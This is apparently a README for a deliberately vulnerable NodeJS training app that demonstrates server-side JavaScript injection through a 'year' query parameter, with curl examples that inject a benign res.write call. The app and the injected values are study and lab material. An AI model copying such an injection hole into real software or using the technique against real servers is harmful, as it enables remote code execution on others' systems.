# Simple SSJI Web App
This is a simple NodeJS application which specifically the Server-Side JavaScript Code Injection vulnerability.

## How to Run
`node app.js` or `npm start`

## Intended Usage
This application simply outputs an `h1` tag with a specified `year` captured from a HTTP GET query. If there is no specified `year`, the current year is displayed.

```
curl http://localhost:3000/
# outputs "The Year is 2022"

curl http://localhost:3000/?year=1970
# outputs "The Year is 1970"
```

## Exploitation
JavaScript code can be injected via the `year` HTTP GET query using the following examples:
```
1. curl -G --data-urlencode "year=<payload>" http://localhost:3000
2. curl -G --data-urlencode "year=res.write('<h1>hello world</h1>')" http://localhost:3000
3. (using the browser) http://localhost:3000/?year=res.write('<h1>hello world</h1>')
```
